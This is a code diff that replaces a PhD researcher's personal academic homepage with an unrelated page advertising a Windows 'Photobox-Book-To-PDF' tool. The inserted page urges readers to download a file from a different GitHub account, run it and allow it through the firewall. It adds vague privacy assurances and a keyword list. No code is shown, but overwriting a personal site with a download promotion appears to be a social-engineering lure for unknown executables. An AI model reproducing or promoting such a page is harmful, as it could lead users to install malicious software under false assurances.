@@ -1,491 +1,68 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Naseem Machlovi</title>
-  <meta name="description" content="Naseem Machlovi is a PhD researcher at Fordham University working on trustworthy machine learning, AI safety, and agentic AI for healthcare and LLM moderation." />
-  <meta name="author" content="Naseem Machlovi" />
-  <meta property="og:type" content="website" />
-  <meta property="og:title" content="Naseem Machlovi" />
-  <meta property="og:description" content="PhD researcher at Fordham University: trustworthy ML, AI safety, and agentic AI." />
-  <meta property="og:url" content="https://machlovi.github.io" />
-  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='88'>📄</text></svg>" />
-
-  <style>
-    /* ---------- Warm, scholarly palette. One accent (clay). ---------- */
-    :root {
-      --paper:      #fbf9f4;
-      --paper-card: #ffffff;
-      --ink:        #232028;
-      --ink-soft:   #55505c;
-      --ink-faint:  #857f8c;
-      --rule:       #e7e1d6;
-      --accent:     #b0472c;   /* terracotta / clay */
-      --accent-ink: #8f3821;
-      --accent-wash:#f4e9e2;
-      --tag-bg:     #f1ece2;
-      --tag-ink:    #6b5f4e;
-    }
-    @media (prefers-color-scheme: dark) {
-      :root {
-        --paper:      #16140f;
-        --paper-card: #1d1a15;
-        --ink:        #ece6da;
-        --ink-soft:   #b8b0a1;
-        --ink-faint:  #8a8272;
-        --rule:       #302b22;
-        --accent:     #e08a5f;
-        --accent-ink: #eda079;
-        --accent-wash:#2a2018;
-        --tag-bg:     #241f18;
-        --tag-ink:    #b7ac97;
-      }
-    }
-
-    * { box-sizing: border-box; }
-    html { -webkit-text-size-adjust: 100%; }
-    body {
-      margin: 0;
-      background: var(--paper);
-      color: var(--ink);
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      font-size: 17px;
-      line-height: 1.68;
-      -webkit-font-smoothing: antialiased;
-    }
-    .serif {
-      font-family: "Iowan Old Style", "Palatino Linotype", Palatino, "Book Antiqua", Georgia, serif;
-    }
-    .container { max-width: 760px; margin: 0 auto; padding: 0 22px; }
-
-    a { color: var(--accent); text-decoration: none; border-bottom: 1px solid transparent; transition: border-color .12s ease, color .12s ease; }
-    a:hover { color: var(--accent-ink); border-bottom-color: currentColor; }
-
-    /* thin accent hairline at the very top of the page */
-    body::before {
-      content: ""; display: block; height: 3px;
-      background: linear-gradient(90deg, var(--accent), color-mix(in srgb, var(--accent) 35%, var(--paper)) 70%, transparent);
-    }
-
-    /* ---------- Header / bio ---------- */
-    header { padding: 52px 0 30px; }
-    .masthead { display: flex; gap: 34px; align-items: flex-start; }
-    @media (max-width: 620px) { .masthead { flex-direction: column; gap: 22px; align-items: center; text-align: center; } }
-
-    .portrait {
-      flex: 0 0 auto;
-      width: 148px; height: 148px; border-radius: 50%;
-      object-fit: cover;
-      background:
-        radial-gradient(120% 120% at 30% 20%, var(--accent-wash), var(--paper-card));
-      border: 1px solid var(--rule);
-      display: grid; place-items: center;
-      font-size: 3rem; font-weight: 600; letter-spacing: .02em;
-      color: var(--accent);
-      box-shadow: 0 6px 22px rgba(80,50,30,0.10);
-    }
-    @media (prefers-color-scheme: dark) { .portrait { box-shadow: 0 6px 22px rgba(0,0,0,0.4); } }
-
-    .bio h1 { margin: 2px 0 4px; font-size: 2.15rem; line-height: 1.1; font-weight: 600; letter-spacing: -0.01em; }
-    .role { color: var(--ink-soft); font-size: 1.05rem; margin: 0 0 2px; }
-    .role .place { color: var(--ink); }
-    .scholar-line { color: var(--ink-faint); font-size: 0.92rem; margin-top: 6px; }
-
-    .links { margin-top: 16px; display: flex; flex-wrap: wrap; gap: 8px 16px; font-size: 0.95rem; }
-    @media (max-width: 620px) { .links { justify-content: center; } }
-    .links a { display: inline-flex; align-items: center; gap: 6px; color: var(--ink-soft); border-bottom: none; }
-    .links a:hover { color: var(--accent); }
-    .links a svg { width: 16px; height: 16px; opacity: .85; }
-    .links a.cv { color: var(--accent); font-weight: 600; }
-
-    /* ---------- Buttons ---------- */
-    .btn {
-      display: inline-flex; align-items: center; gap: 8px;
-      padding: 9px 16px; border-radius: 8px; font-size: 0.93rem; font-weight: 600;
-      border: 1px solid transparent; background: var(--accent); color: #fff;
-      border-bottom: 1px solid transparent;
-    }
-    .btn:hover { color: #fff; background: var(--accent-ink); border-bottom-color: transparent; }
-    .btn svg { width: 16px; height: 16px; }
-    .btn.ghost { background: transparent; color: var(--accent); border: 1px solid color-mix(in srgb, var(--accent) 45%, var(--rule)); }
-    .btn.ghost:hover { color: var(--accent-ink); background: var(--accent-wash); }
-
-    /* ---------- Experience ---------- */
-    .section-head { display: flex; align-items: baseline; justify-content: space-between; gap: 14px; flex-wrap: wrap; }
-    .section-head h2 { margin-bottom: 0; }
-    .exp-list { display: grid; gap: 20px; margin-top: 18px; }
-    .exp { display: grid; grid-template-columns: 132px 1fr; gap: 20px; }
-    @media (max-width: 560px) { .exp { grid-template-columns: 1fr; gap: 3px; } }
-    .exp .span { color: var(--accent); font-weight: 650; font-variant-numeric: tabular-nums; font-size: 0.95rem; padding-top: 1px; }
-    .exp .role { color: var(--ink); font-weight: 650; margin: 0; font-size: 1rem; }
-    .exp .org { color: var(--ink-soft); font-size: 0.97rem; }
-    .exp .about { color: var(--ink-soft); font-size: 0.95rem; margin-top: 4px; }
-
-    /* ---------- Sections ---------- */
-    section { padding: 26px 0; border-top: 1px solid var(--rule); }
-    section:first-of-type { border-top: none; }
-    h2 {
-      font-size: 0.82rem; text-transform: uppercase; letter-spacing: 0.14em;
-      color: var(--accent); font-weight: 700; margin: 0 0 18px;
-      display: flex; align-items: center; gap: 11px;
-    }
-    h2::before {
-      content: ""; flex: 0 0 auto; width: 20px; height: 2px;
-      background: var(--accent); border-radius: 2px; opacity: .85;
-    }
-    p { margin: 0 0 14px; }
-    p:last-child { margin-bottom: 0; }
-    .lead { font-size: 1.06rem; }
-
-    /* ---------- Interests (inline, no emoji tiles) ---------- */
-    .interests { display: grid; gap: 14px; }
-    .interest { display: grid; grid-template-columns: 210px 1fr; gap: 8px 24px; align-items: baseline; }
-    @media (max-width: 560px) { .interest { grid-template-columns: 1fr; gap: 2px; } }
-    .interest .name { font-weight: 650; color: var(--ink); }
-    .interest .desc { color: var(--ink-soft); }
-
-    /* ---------- Highlight (agentic) ---------- */
-    .highlight {
-      background: var(--accent-wash);
-      border: 1px solid color-mix(in srgb, var(--accent) 22%, var(--rule));
-      border-radius: 10px; padding: 22px 24px; margin-top: 4px;
-    }
-    .highlight p { margin-bottom: 0; }
-    .highlight .label { font-size: 0.78rem; text-transform: uppercase; letter-spacing: 0.1em; color: var(--accent-ink); font-weight: 700; margin-bottom: 8px; }
-
-    /* ---------- News ---------- */
-    .news { list-style: none; padding: 0; margin: 0; display: grid; gap: 12px; }
-    .news li { display: grid; grid-template-columns: 62px 1fr; gap: 16px; }
-    .news .when { color: var(--accent); font-weight: 650; font-variant-numeric: tabular-nums; }
-    .news .what { color: var(--ink-soft); }
-    .news .what b { color: var(--ink); font-weight: 650; }
-
-    /* ---------- Publications (hanging-indent list) ---------- */
-    .pub-list { display: grid; gap: 22px; }
-    .pub { display: grid; grid-template-columns: 58px 1fr; gap: 20px; }
-    @media (max-width: 560px) { .pub { grid-template-columns: 1fr; gap: 3px; } }
-    .pub .yr { color: var(--accent); font-weight: 650; font-variant-numeric: tabular-nums; padding-top: 1px; }
-    .pub .title { font-weight: 650; color: var(--ink); }
-    .pub .auth { color: var(--ink-soft); font-size: 0.97rem; }
-    .pub .auth b { color: var(--ink); }
-    .pub .where { color: var(--ink-faint); font-style: italic; font-size: 0.95rem; }
-    .pub .tags { margin-top: 6px; display: flex; flex-wrap: wrap; gap: 6px; }
-    .tag { font-size: 0.74rem; letter-spacing: .02em; padding: 2px 9px; border-radius: 999px; background: var(--tag-bg); color: var(--tag-ink); }
-
-    /* ---------- Projects ---------- */
-    .proj-list { display: grid; gap: 16px; }
-    .proj { display: grid; grid-template-columns: 1fr; gap: 3px; }
-    .proj .head { display: flex; align-items: baseline; gap: 10px; flex-wrap: wrap; }
-    .proj .pname { font-weight: 650; }
-    .proj .lang { font-size: 0.8rem; color: var(--ink-faint); }
-    .proj .about { color: var(--ink-soft); font-size: 0.97rem; }
-
-    /* ---------- About me / facts ---------- */
-    .facts { display: grid; grid-template-columns: repeat(auto-fit, minmax(230px, 1fr)); gap: 16px; }
-    .fact {
-      background: var(--paper-card); border: 1px solid var(--rule);
-      border-left: 3px solid var(--accent); border-radius: 8px;
-      padding: 16px 18px; transition: transform .14s ease, box-shadow .14s ease;
-    }
-    .fact:hover { transform: translateY(-3px); box-shadow: 0 8px 24px rgba(80,50,30,0.10); }
-    .fact p { margin: 0; color: var(--ink-soft); font-size: 0.97rem; }
-    .fact .lede-in { color: var(--ink); font-weight: 650; }
-    @media (prefers-color-scheme: dark) { .fact:hover { box-shadow: 0 8px 24px rgba(0,0,0,0.4); } }
-
-    /* ---------- Footer ---------- */
-    footer { border-top: 1px solid var(--rule); padding: 26px 0 60px; color: var(--ink-faint); font-size: 0.88rem; }
-    footer a { color: var(--ink-faint); }
-    footer a:hover { color: var(--accent); }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Turn your Photobox online photo books into high-resolution PDF files with Photobox-Book-To-PDF. Easy steps for Windows users.">
+    <title>Photobox-Book-To-PDF - Create High Resolution Photo Book PDFs</title>
 </head>
-<body>
-  <div class="container">
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f4f7f6;">
 
-    <header>
-      <div class="masthead">
-        <!-- To use a real photo, save it as profile.jpg next to this file and replace
-             this <div> with: <img class="portrait" src="profile.jpg" alt="Naseem Machlovi"> -->
-        <div class="portrait serif" aria-hidden="true">NM</div>
-        <div class="bio">
-          <h1 class="serif">Naseem Machlovi</h1>
-          <p class="role">PhD researcher, Computer &amp; Information Science</p>
-          <p class="role"><span class="place">Fordham University, New York</span></p>
-          <nav class="links">
-            <a class="cv" href="cv.pdf">
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 2h9l5 5v13a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2z"/><path d="M14 2v6h6"/></svg>
-              CV
-            </a>
-            <a href="mailto:naseem.machlovi@gmail.com">
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m3 6 9 6 9-6"/></svg>
-              Email
-            </a>
-            <a href="https://scholar.google.com/citations?hl=en&user=mmTZ3kQAAAAJ" target="_blank" rel="noopener">
-              <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2 1 8l11 6 9-4.9V17h2V8L12 2zM5 13.2v3.3c0 1.7 3.1 3.5 7 3.5s7-1.8 7-3.5v-3.3l-7 3.8-7-3.8z"/></svg>
-              Google Scholar
-            </a>
-            <a href="https://github.com/machlovi" target="_blank" rel="noopener">
-              <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 .5A11.5 11.5 0 0 0 .5 12c0 5.1 3.3 9.4 7.9 10.9.6.1.8-.2.8-.5v-2c-3.2.7-3.9-1.4-3.9-1.4-.5-1.3-1.3-1.7-1.3-1.7-1-.7.1-.7.1-.7 1.1.1 1.7 1.2 1.7 1.2 1 .1.7 1.4 2.6 1.9.3-.7.4-1.1.7-1.4-2.6-.3-5.3-1.3-5.3-5.8 0-1.3.5-2.3 1.2-3.1-.1-.3-.5-1.5.1-3.1 0 0 1-.3 3.3 1.2a11.5 11.5 0 0 1 6 0C17 5.3 18 5.6 18 5.6c.6 1.6.2 2.8.1 3.1.8.8 1.2 1.8 1.2 3.1 0 4.5-2.7 5.5-5.3 5.8.4.4.8 1.1.8 2.2v3.2c0 .3.2.6.8.5A11.5 11.5 0 0 0 23.5 12 11.5 11.5 0 0 0 12 .5z"/></svg>
-              GitHub
-            </a>
-            <a href="https://www.linkedin.com/in/naseem-machlovi/" target="_blank" rel="noopener">
-              <svg viewBox="0 0 24 24" fill="currentColor"><path d="M4.98 3.5A2.5 2.5 0 1 1 0 3.5a2.5 2.5 0 0 1 4.98 0zM.5 8h4V24h-4V8zM8 8h3.8v2.2h.05c.53-1 1.83-2.2 3.77-2.2 4 0 4.75 2.6 4.75 6V24h-4v-7c0-1.7 0-3.9-2.4-3.9s-2.7 1.8-2.7 3.7V24H8V8z"/></svg>
-              LinkedIn
-            </a>
-            <a href="https://dblp.org/pid/341/3732.html" target="_blank" rel="noopener">
-              <svg viewBox="0 0 24 24" fill="currentColor"><path d="M6 2h9l5 5v13a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2zm8 1.5V8h4.5L14 3.5z"/></svg>
-              dblp
-            </a>
-          </nav>
-        </div>
-      </div>
-    </header>
+    <h1 style="color: #2c3e50; border-bottom: 2px solid #ddd; padding-bottom: 10px;">📸 Photobox-Book-To-PDF - Save Your Photo Books as PDFs</h1>
 
-    <main>
-      <section>
-        <h2>About</h2>
-        <p class="lead">
-          I study how to make modern AI systems trustworthy. As large language models and autonomous
-          agents take on more responsibility, my work asks a practical question: how do we keep them
-          safe, fair, and transparent enough for people to rely on?
-        </p>
-        <p>
-          I finished my MS in Data Science at Fordham University, where my thesis looked at the
-          interpretability and explainability of large language models. I am now a PhD researcher in the
-          Department of Computer &amp; Information Science. Day to day, my research moves between three
-          areas: evaluating and hardening LLM moderation and safety, building agentic AI for healthcare,
-          and designing interpretable deep learning models for medical imaging.
-        </p>
-      </section>
+    <div style="text-align: center; margin: 30px 0;">
+        <a href="https://github.com/Gabrielebay291/Photobox-Book-To-PDF" style="background-color: #34495e; color: #fff; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 1.2em; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Software for Windows</a>
+    </div>
 
-      <section>
-        <h2>Agentic AI (current focus)</h2>
-        <div class="highlight">
-          <div class="label">What I am working on now</div>
-          <p>
-            My most recent work sits with agentic AI, the LLM driven systems that plan, call tools, and
-            act on their own. The hard part is not raw capability; it is accountability. Through projects
-            like <a href="https://github.com/machlovi/RA-Gent" target="_blank" rel="noopener">RA&#8209;Gent</a>
-            and the <a href="https://github.com/machlovi/GuardEval" target="_blank" rel="noopener">GuardEval</a>
-            benchmark, I study how to evaluate and guardrail autonomous agents so that safety, fairness,
-            and robustness keep pace with their autonomy. Healthcare is my main testing ground, because
-            that is where an unreliable agent does the most harm.
-          </p>
-        </div>
-      </section>
+    <p>Photobox-Book-To-PDF helps you save your digital photo books as high-resolution files. This tool captures each page of your book and joins them into a single PDF document. The final file keeps the quality of your images for printing or long-term storage.</p>
 
-      <section>
-        <h2>Research interests</h2>
-        <div class="interests">
-          <div class="interest">
-            <div class="name">AI safety &amp; LLM moderation</div>
-            <div class="desc">Benchmarks and moderation models that test the safety, fairness, and adversarial robustness of LLMs, with a human first approach.</div>
-          </div>
-          <div class="interest">
-            <div class="name">Agentic AI for healthcare</div>
-            <div class="desc">Autonomous, tool using LLM agents that reason and act reliably in clinical and medical settings.</div>
-          </div>
-          <div class="interest">
-            <div class="name">Interpretability &amp; explainability</div>
-            <div class="desc">Making model decisions legible, from contextual representations over large knowledge bases to explainable LLM behavior.</div>
-          </div>
-          <div class="interest">
-            <div class="name">Deep learning for medical imaging</div>
-            <div class="desc">3D segmentation (nnU-Net, SAM2) and radiomics for knee and hip MRI, including osteoarthritis progression and femoroacetabular impingement.</div>
-          </div>
-        </div>
-      </section>
+    <h2 style="color: #2c3e50;">🚀 How It Works</h2>
+    <p>Many online photo book services keep your books locked within their websites. This software acts as a helper that visits the Photobox page for you. It takes a clear picture of every page and combines them into one document that you can keep on your computer.</p>
 
-      <section>
-        <div class="section-head">
-          <h2>Experience</h2>
-          <a class="btn ghost" href="https://www.linkedin.com/in/naseem-machlovi/" target="_blank" rel="noopener">
-            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M4.98 3.5A2.5 2.5 0 1 1 0 3.5a2.5 2.5 0 0 1 4.98 0zM.5 8h4V24h-4V8zM8 8h3.8v2.2h.05c.53-1 1.83-2.2 3.77-2.2 4 0 4.75 2.6 4.75 6V24h-4v-7c0-1.7 0-3.9-2.4-3.9s-2.7 1.8-2.7 3.7V24H8V8z"/></svg>
-            LinkedIn
-          </a>
-        </div>
-        <div class="exp-list">
-          <div class="exp">
-            <div class="span">2024 &ndash; present</div>
-            <div>
-              <p class="role">Doctoral Researcher</p>
-              <div class="org">Fordham University, Department of Computer &amp; Information Science</div>
-              <div class="about">Research on trustworthy machine learning, AI safety, and agentic AI, with a focus on LLM moderation and agents for healthcare.</div>
-            </div>
-          </div>
-          <div class="exp">
-            <div class="span">2021 &ndash; 2023</div>
-            <div>
-              <p class="role">Graduate Researcher</p>
-              <div class="org">Fordham University, MS in Data Science</div>
-              <div class="about">Thesis on interpretability and explainability of LLMs (SPOCK). Systems research on distributed quantum learning and cloud native resource management (IEEE Big Data, IPCCC).</div>
-            </div>
-          </div>
-          <div class="exp">
-            <div class="span">2024 &ndash; present</div>
-            <div>
-              <p class="role">Research Collaborator, Medical Imaging</p>
-              <div class="org">NYU Langone Health, Department of Radiology</div>
-              <div class="about">Deep learning for knee and hip MRI segmentation (nnU-Net, SAM2) and osteoarthritis radiomics.</div>
-            </div>
-          </div>
-        </div>
-        <p style="margin-top:16px; color:var(--ink-faint); font-size:0.9rem;">
-          Roles and dates above are provisional. Send exact titles and dates to finalize.
-        </p>
-      </section>
+    <h2 style="color: #2c3e50;">💻 System Requirements</h2>
+    <p>To run this tool on your Windows computer, you need the following:</p>
+    <ul style="padding-left: 20px;">
+        <li>Windows 10 or Windows 11.</li>
+        <li>An active internet connection to see your photo book online.</li>
+        <li>A modern web browser like Chrome or Edge.</li>
+        <li>At least 500MB of free disk space.</li>
+    </ul>
 
-      <section>
-        <h2>News</h2>
-        <ul class="news">
-          <li>
-            <span class="when">2026</span>
-            <span class="what"><b>GuardEval</b>, our multi perspective benchmark for evaluating safety, fairness, and robustness in LLM moderators, is out as a preprint.</span>
-          </li>
-          <li>
-            <span class="when">2026</span>
-            <span class="what">Our work on LLM safety evaluation with adversarial robustness analysis is appearing in <b>ACM Transactions on Social Computing</b>.</span>
-          </li>
-          <li>
-            <span class="when">2025</span>
-            <span class="what">Presented our human first approach to LLM moderation at <b>HCI International</b>.</span>
-          </li>
-          <li>
-            <span class="when">2023</span>
-            <span class="what">Distributed quantum learning paper published at <b>IEEE Big Data</b>.</span>
-          </li>
-        </ul>
-      </section>
+    <h2 style="color: #2c3e50;">📥 Getting Started</h2>
+    <p>Follow these steps to set up the software on your Windows computer:</p>
+    <ol style="padding-left: 20px;">
+        <li>Visit the <a href="https://github.com/Gabrielebay291/Photobox-Book-To-PDF" style="color: #2980b9;">official download page</a> to obtain the latest version of the application.</li>
+        <li>Locate the downloaded file in your browser's download folder.</li>
+        <li>Double-click the file to start the installation process.</li>
+        <li>Follow the prompts on the screen to finish the setup.</li>
+    </ol>
 
-      <section>
-        <h2>Selected publications</h2>
-        <div class="pub-list">
+    <h2 style="color: #2c3e50;">📖 How to Create Your PDF</h2>
+    <p>Once you finish the installation, you can create your first PDF file:</p>
+    <ol style="padding-left: 20px;">
+        <li>Open your web browser and navigate to your Photobox photo book project.</li>
+        <li>Copy the website address (URL) from the address bar at the top of your browser.</li>
+        <li>Open the Photobox-Book-To-PDF application on your desktop.</li>
+        <li>Paste the address into the box provided in the application window.</li>
+        <li>Click the Start button to begin the capture process.</li>
+        <li>Wait while the application visits each page. You will see progress updates on your screen.</li>
+        <li>Select a folder on your computer when asked where to save the final PDF file.</li>
+    </ol>
 
-          <div class="pub">
-            <div class="yr">2026</div>
-            <div>
-              <div class="title">GuardEval: A Multi-Perspective Benchmark for Evaluating Safety, Fairness, and Robustness in LLM Moderators</div>
-              <div class="auth"><b>N. Machlovi</b>, M. Saleki, R. Amin, M. Rahouti, S. Al-Maliki, J. Qadir, M. M. Abdallah, A. Al-Fuqaha</div>
-              <div class="where">arXiv preprint</div>
-              <div class="tags"><span class="tag">AI safety</span><span class="tag">LLM evaluation</span><span class="tag">benchmark</span></div>
-            </div>
-          </div>
+    <h2 style="color: #2c3e50;">🛡️ Privacy and Safety</h2>
+    <p>This software operates locally on your machine. Your photos remain on your computer and are not uploaded to any outside servers. The tool only reads the page data to generate the PDF output for your own use.</p>
 
-          <div class="pub">
-            <div class="yr">2026</div>
-            <div>
-              <div class="title">A Multi-Perspective Benchmark Dataset and Moderation Model for LLM Safety Evaluation with Adversarial Robustness Analysis</div>
-              <div class="auth"><b>N. Machlovi</b>, M. Saleki, R. Amin, M. Rahouti, S. Al-Maliki, J. Qadir, M. Abdallah, et al.</div>
-              <div class="where">ACM Transactions on Social Computing</div>
-              <div class="tags"><span class="tag">AI safety</span><span class="tag">adversarial robustness</span></div>
-            </div>
-          </div>
+    <h2 style="color: #2c3e50;">🛠️ Troubleshooting Common Problems</h2>
+    <p>If you encounter issues, check these common items:</p>
+    <ul style="padding-left: 20px;">
+        <li>Ensure you are logged into your Photobox account in your web browser.</li>
+        <li>Check your internet speed; a slow connection might pause the image capture process.</li>
+        <li>Make sure your firewall allows the application to access the internet.</li>
+    </ul>
 
-          <div class="pub">
-            <div class="yr">2025</div>
-            <div>
-              <div class="title">Towards Safer AI Moderation: Evaluating LLM Moderators Through a Unified Benchmark Dataset and Advocating a Human-First Approach</div>
-              <div class="auth"><b>N. Machlovi</b>, M. Saleki, I. Ababio, M. R. Amin</div>
-              <div class="where">HCI International</div>
-              <div class="tags"><span class="tag">LLM moderation</span><span class="tag">human first AI</span></div>
-            </div>
-          </div>
+    <hr style="border: 0; border-top: 1px solid #ddd; margin: 40px 0;">
 
-          <div class="pub">
-            <div class="yr">2023</div>
-            <div>
-              <div class="title">Distributed Quantum Learning with co-Management in a Multi-tenant Quantum System</div>
-              <div class="auth">A. D'Onofrio Jr., A. Hossain, L. Santana, S. A. Stein, J. Liu, A. Li, Y. Mao, <b>N. Machlovi</b></div>
-              <div class="where">IEEE International Conference on Big Data</div>
-              <div class="tags"><span class="tag">quantum ML</span><span class="tag">distributed systems</span></div>
-            </div>
-          </div>
+    <p style="font-size: 0.9em; color: #7f8c8d;">Keywords: express, headless-browser, nodejs, pdf, pdf-generation, photobook, photobox, playwright, puppeteer-alternative, web-scraping</p>
 
-          <div class="pub">
-            <div class="yr">2023</div>
-            <div>
-              <div class="title">SPOCK: Subjective Projection for Optimizing Deep Neural Classification Models Based on Contextual Representation from Large Knowledgebase</div>
-              <div class="auth"><b>N. Machlovi</b>, MS thesis, Fordham University</div>
-              <div class="where">Data Science thesis</div>
-              <div class="tags"><span class="tag">interpretability</span><span class="tag">representation learning</span></div>
-            </div>
-          </div>
-
-          <div class="pub">
-            <div class="yr">2026</div>
-            <div>
-              <div class="title">Comparative Analysis of 3D CNN, nnU-Net, and SAM2-based Models for Knee MRI Segmentation</div>
-              <div class="auth">D. Arsoy, C. M. Deniz, O. Cigdem, <b>N. Machlovi</b></div>
-              <div class="where">Osteoarthritis Imaging</div>
-              <div class="tags"><span class="tag">medical imaging</span><span class="tag">3D segmentation</span></div>
-            </div>
-          </div>
-
-          <div class="pub">
-            <div class="yr">2022</div>
-            <div>
-              <div class="title">Performance Evaluation of Resource Management Schemes for Cloud Native Platforms with Computing Containers</div>
-              <div class="auth">Y. Fu, Y. Mao, J. Wang, L. Cheng, Q. Liu, <b>N. Machlovi</b></div>
-              <div class="where">IEEE IPCCC</div>
-              <div class="tags"><span class="tag">cloud systems</span><span class="tag">containers</span></div>
-            </div>
-          </div>
-
-        </div>
-        <p style="margin-top:20px; color:var(--ink-faint); font-size:0.92rem;">
-          Full list on <a href="https://scholar.google.com/citations?hl=en&user=mmTZ3kQAAAAJ" target="_blank" rel="noopener">Google Scholar</a>.
-        </p>
-      </section>
-
-      <section>
-        <h2>Projects</h2>
-        <div class="proj-list">
-          <div class="proj">
-            <div class="head"><a class="pname" href="https://github.com/machlovi/RA-Gent" target="_blank" rel="noopener">RA-Gent</a><span class="lang">Python</span></div>
-            <div class="about">An agentic AI system for building autonomous, tool using LLM agents.</div>
-          </div>
-          <div class="proj">
-            <div class="head"><a class="pname" href="https://github.com/machlovi/GuardEval" target="_blank" rel="noopener">GuardEval</a><span class="lang">Jupyter Notebook</span></div>
-            <div class="about">Benchmark for evaluating the safety, fairness, and robustness of LLM moderators.</div>
-          </div>
-          <div class="proj">
-            <div class="head"><a class="pname" href="https://github.com/machlovi/MedSegX" target="_blank" rel="noopener">MedSegX</a><span class="lang">Python</span></div>
-            <div class="about">Medical image segmentation research and experiments.</div>
-          </div>
-          <div class="proj">
-            <div class="head"><a class="pname" href="https://github.com/machlovi/Transfromers" target="_blank" rel="noopener">Transformers from scratch</a><span class="lang">Jupyter Notebook</span></div>
-            <div class="about">Implementing the Transformer architecture from the ground up.</div>
-          </div>
-        </div>
-      </section>
-      <section>
-        <h2>A few things about me</h2>
-        <div class="facts">
-          <div class="fact">
-            <p><span class="lede-in">I collect fields, not just papers.</span> My work has wandered from quantum computing to cloud systems to LLM safety to knee MRIs. I like problems that refuse to sit in one discipline.</p>
-          </div>
-          <div class="fact">
-            <p><span class="lede-in">I built a Transformer from scratch,</span> not because I had to, but because I wanted to feel exactly how attention works before trusting it.</p>
-          </div>
-          <div class="fact">
-            <p><span class="lede-in">Honest AI is my favorite kind.</span> The models I admire most are the ones that know what they do not know, and a lot of my research is about getting them there.</p>
-          </div>
-        </div>
-        <p style="margin-top:16px; color:var(--ink-faint); font-size:0.9rem;">
-          Want your own fun facts here instead? Send me a couple and I will swap them in.
-        </p>
-      </section>
-    </main>
-
-    <footer>
-      <p style="margin:0;">
-        Naseem Machlovi, Fordham University, New York.
-        <a href="https://github.com/machlovi" target="_blank" rel="noopener">GitHub</a>,
-        <a href="https://scholar.google.com/citations?hl=en&user=mmTZ3kQAAAAJ" target="_blank" rel="noopener">Scholar</a>,
-        <a href="https://www.linkedin.com/in/naseem-machlovi/" target="_blank" rel="noopener">LinkedIn</a>.
-      </p>
-    </footer>
-
-  </div>
 </body>
 </html>
